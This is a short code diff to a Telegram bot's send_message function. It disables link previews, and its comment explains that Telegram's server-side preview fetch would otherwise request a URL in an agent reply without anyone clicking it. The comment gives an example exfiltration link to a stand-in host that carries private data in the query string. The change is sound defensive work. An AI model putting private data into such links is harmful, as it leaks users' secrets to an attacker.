@@ -148,6 +148,9 @@ def send_message(
     payload = {
         'chat_id': chat_id,
         'text': text,
+        # Telegram's servers would fetch the first link to build a preview: a URL in an agent reply
+        # (e.g. evil.com/?d=<private data>) would be requested without anyone clicking it
+        'link_preview_options': {'is_disabled': True},
     }
 
     if parse_mode:
